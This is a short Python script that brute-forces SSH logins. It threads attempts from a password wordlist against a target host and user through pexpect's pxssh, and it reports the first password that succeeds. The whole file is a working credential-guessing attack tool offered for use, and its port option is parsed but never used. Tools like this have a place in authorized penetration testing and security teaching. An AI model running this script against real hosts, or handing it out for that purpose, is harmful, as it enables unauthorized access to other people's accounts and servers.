#!/usr/bin/env python

import argparse
import pexpect.pxssh as pxssh
import queue
import threading
import time


MAX_CONNECTIONS = 5
MAX_FAILS = 5

connection_lock = threading.BoundedSemaphore(value=MAX_CONNECTIONS)


def connect(host, user, password, release, found, fails):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)

        print(f"[+] Password found: {password}")

        found.put(password)
    except pxssh.ExceptionPxssh as e:
        if "read_nonblocking" in str(e):
            time.sleep(5)
            connect(host, user, password, False, found, fails)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False, found, fails)
        elif "Could not establish connection to host" in str(e):
            try:
                fails.put_nowait(True)
            except queue.Full as e:
                pass
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser(description="brute force SSH passwords")

    parser.add_argument("-u", dest="user", type=str, help="specify SSH user")
    parser.add_argument("-H", dest="host", type=str, help="specify SSH host")
    parser.add_argument("-P", dest="port", type=str, help="specify SSH port")
    parser.add_argument("-f", dest="password_file", type=str, help="specify your passwords file")

    args = parser.parse_args()

    user = args.user
    host = args.host
    port = args.port
    password_file = args.password_file

    found = queue.Queue(maxsize=1)
    fails = queue.Queue(maxsize=MAX_FAILS)

    with open(password_file, 'r') as f:
        for line in f.readlines():
            if not found.empty():
                print("[+] Exiting: password found")
                exit(0)

            if fails.full():
                print("[-] Exiting: could not establish connection to host")

                exit(1)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')

            print(f"[*] Testing: {str(password)}")
            t = threading.Thread(target=connect, args=(host, user, password, True, found, fails))
            child = t.start()


if __name__ == '__main__':
    main()
